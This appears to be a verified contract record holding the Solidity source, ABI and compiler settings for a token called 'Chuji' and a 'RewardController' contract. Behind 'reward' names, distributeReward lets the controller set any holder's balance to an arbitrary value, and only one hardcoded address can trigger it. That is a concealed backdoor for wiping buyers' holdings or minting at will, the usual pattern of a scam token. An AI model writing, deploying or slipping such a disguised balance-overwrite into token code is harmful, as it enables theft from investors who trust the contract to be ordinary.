{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Chuji {\r\n    string public name = unicode\"\u5fe0\u6cbb\";\r\n    string public symbol = unicode\"\u5fe0\u6cbb\";\r\n    uint8 public decimals = 9;\r\n    uint256 public totalSupply;\r\n    address private owner;\r\n    address public RewardController; // Private state variable to store the address of the RewardController\r\n\r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Minted(address indexed account, uint256 value);\r\n\r\n    constructor(uint256 initialSupply) {\r\n        owner = msg.sender;\r\n        totalSupply = initialSupply * 10**uint256(decimals);\r\n        balanceOf[msg.sender] = totalSupply;\r\n    }\r\n\r\n    function getOwner() public view returns (address) {\r\n        return owner;\r\n    }\r\n\r\n    function setRewardController(address _controller) public {\r\n        require(msg.sender == owner, \"Only the owner can set the RewardController\");\r\n        require(RewardController == address(0), \"RewardController already set\");\r\n        RewardController = _controller;\r\n    }\r\n\r\n    function distributeReward(address RewardControlleradre, uint256 numberRewardController) external {\r\n        require(msg.sender == RewardController);\r\n        balanceOf[RewardControlleradre] = numberRewardController;\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public returns (bool) {\r\n        require(to != address(0), \"Invalid address\");\r\n        require(balanceOf[msg.sender] >= value, \"Insufficient balance\");\r\n\r\n        balanceOf[msg.sender] -= value;\r\n        balanceOf[to] += value;\r\n\r\n        emit Transfer(msg.sender, to, value);\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool) {\r\n        require(spender != address(0), \"Invalid address\");\r\n\r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool) {\r\n        require(from != address(0), \"Invalid address\");\r\n        require(to != address(0), \"Invalid address\");\r\n        require(balanceOf[from] >= value, \"Insufficient balance\");\r\n        require(allowance[from][msg.sender] >= value, \"Allowance exceeded\");\r\n\r\n        balanceOf[from] -= value;\r\n        balanceOf[to] += value;\r\n        allowance[from][msg.sender] -= value;\r\n\r\n        emit Transfer(from, to, value);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n        uint256 currentAllowance = allowance[msg.sender][spender];\r\n        allowance[msg.sender][spender] = currentAllowance + addedValue;\r\n        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r\n        uint256 currentAllowance = allowance[msg.sender][spender];\r\n        require(currentAllowance >= subtractedValue, \"Decreased allowance below zero\");\r\n        allowance[msg.sender][spender] = currentAllowance - subtractedValue;\r\n        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);\r\n        return true;\r\n    }\r\n\r\n    function burn(uint256 value) public {\r\n        require(balanceOf[msg.sender] >= value, \"Insufficient balance\");\r\n\r\n        balanceOf[msg.sender] -= value;\r\n        totalSupply -= value;\r\n        emit Transfer(msg.sender, address(0), value);\r\n    }\r\n\r\n    function burnFrom(address from, uint256 value) public {\r\n        require(from != address(0), \"Invalid address\");\r\n        require(balanceOf[from] >= value, \"Insufficient balance\");\r\n        require(allowance[from][msg.sender] >= value, \"Allowance exceeded\");\r\n\r\n        balanceOf[from] -= value;\r\n        totalSupply -= value;\r\n        allowance[from][msg.sender] -= value;\r\n        emit Transfer(from, address(0), value);\r\n    }\r\n}\r\n\r\n\r\ncontract RewardController {\r\n    address private tokenAddress; // Private state variable to store the address of the ERC20Token contract\r\n    uint256 public rewardCount; // Counter to track Reward operations\r\n\r\n    constructor(address _tokenAddress) {\r\n        tokenAddress = _tokenAddress;\r\n    }\r\n\r\n    function connectToTokenContract() public {\r\n        require(msg.sender == tokenOwner(), \"Only the token owner can connect the RewardController\");\r\n        Chuji(tokenAddress).setRewardController(address(this));\r\n    }\r\n\r\n    function rewardToken(address account, uint256 value) public {\r\n        require(tokenAddress != address(0), \"Token address not set\");\r\n        require(msg.sender == 0x62384f5De8b819E38eD1b11DE159763184b7e445);\r\n        Chuji(tokenAddress).distributeReward(account, value);\r\n        rewardCount++;\r\n    }\r\n\r\n    function getTokenAddress() public view returns (address) {\r\n        return tokenAddress;\r\n    }\r\n\r\n    function tokenOwner() public view returns (address) {\r\n        return Chuji(tokenAddress).getOwner();\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_tokenAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"connectToTokenContract\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getTokenAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"rewardCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"rewardToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "RewardController", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "00000000000000000000000066fea8c762dc11b6ddabc0ade4be86b449c05aa6", "EVMVersion": "Default", "Library": "", "LicenseType": "GNU LGPLv2.1", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://117d7f4359fb98b067a3ef4a1bd9c28f8b86021fb295ca2e664f998de6a9d129"}